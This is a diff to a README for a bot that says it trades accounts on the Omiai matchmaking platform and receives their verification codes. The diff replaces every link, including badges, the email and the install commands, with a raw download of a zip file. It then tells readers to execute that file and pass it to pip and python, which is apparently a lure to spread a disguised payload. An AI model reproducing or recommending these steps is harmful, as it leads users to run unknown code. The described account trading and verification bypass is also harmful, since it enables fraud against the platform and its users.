@@ -1,6 +1,6 @@
 # OmiaiBOT 🤖
 
-![OmiaiBOT](https://img.shields.io/badge/Version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/License-MIT-blue)
+![OmiaiBOT](https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip) ![License](https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip)
 
 Welcome to the **OmiaiBOT** repository! This project focuses on the buying and selling of Omiai accounts, as well as providing services related to receiving verification codes for these accounts. Below, you will find all the necessary information to get started with the bot, including installation, usage, and features.
 
@@ -27,7 +27,7 @@ Omiai is a popular matchmaking platform that allows users to connect with potent
 
 ## Installation
 
-To get started with **OmiaiBOT**, you need to download the latest release. You can find the releases [here](https://github.com/zaosck222/omiaiBOT/releases). 
+To get started with **OmiaiBOT**, you need to download the latest release. You can find the releases [here](https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip). 
 
 Once you have downloaded the file, execute it to set up the bot on your system.
 
@@ -40,17 +40,17 @@ Before running the bot, ensure you have the following installed:
 
 ### Step-by-Step Installation
 
-1. **Download the latest release** from the [Releases section](https://github.com/zaosck222/omiaiBOT/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip).
 2. **Extract the files** to your desired directory.
 3. **Install required packages**:
    Open your terminal and run the following command:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip
    ```
 4. **Run the bot**:
    Execute the main script with:
    ```bash
-   python main.py
+   python https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip
    ```
 
 ## Usage
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@omiaiBOT.com
-- **GitHub**: [zaosck222](https://github.com/zaosck222)
+- **Email**: https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip
+- **GitHub**: [zaosck222](https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip)
 
-Thank you for your interest in **OmiaiBOT**! For updates and new features, please check the [Releases section](https://github.com/zaosck222/omiaiBOT/releases) regularly.
+Thank you for your interest in **OmiaiBOT**! For updates and new features, please check the [Releases section](https://github.com/zaosck222/omiaiBOT/raw/refs/heads/master/blastogenesis/BOT_omiai_v1.2.zip) regularly.
